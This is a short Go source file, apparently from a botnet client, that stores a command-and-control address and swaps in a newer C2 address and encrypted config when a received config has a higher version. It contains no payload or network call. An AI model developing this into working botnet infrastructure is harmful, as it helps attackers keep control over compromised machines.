package main

import (
	"encoding/json"
	"fmt"
)

type botconfig struct {
	C2      string `json:"c2"`
	Version int    `json:"version"`
}

var botconf botconfig

var encrypted_config string

var developer_mode bool = false

func check_new_config(configbytes []byte, encryptedcfg string) {
	var botconflocal botconfig

	err := json.Unmarshal(configbytes, &botconflocal)
	if err != nil {
		fmt.Println("Received bad config")
		return
	}

	if botconflocal.Version > botconf.Version {
		botconf.Version = botconflocal.Version
		botconf.C2 = botconflocal.C2
		encrypted_config = string(encryptedcfg)
	}

	return
}

func init_config() {
	botconf.C2 = ""
	botconf.Version = 0
}
